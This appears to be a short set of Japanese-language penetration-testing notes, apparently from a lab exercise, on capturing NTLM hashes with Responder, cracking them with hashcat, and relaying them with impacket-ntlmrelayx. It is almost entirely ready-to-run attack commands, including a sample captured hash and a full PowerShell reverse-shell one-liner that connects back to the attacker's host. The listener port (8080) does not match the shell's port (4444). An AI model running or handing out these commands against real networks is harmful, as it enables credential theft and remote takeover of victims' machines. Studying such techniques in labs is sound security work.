
# NTLM hash取得する
- reponderを起動する
sudo responder -I tap0

‐ ターゲット端末上でSMBアクセスを実行
dir \\<kali IP>\test

‐ 得たNTLMhashをuser.hashとして保存
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...


‐ passをクラック
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force

# リレーのやり方（NTLMハッシュがクラックできないとき）

‐ SMBサーバーを起動
impacket-ntlmrelayx --no-http-server -smb2support -t <横展開先IP> -c "powershell -enc JABjAGwAaQBlAG4AdA..."

下記コマンドをbase64にする
$client = New-Object System.Net.Sockets.TCPClient('<kali IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


- kaliで待ち受ける
nc -nvlp 8080


-ターゲット端末で下記実施
dir \\<kali IP>\test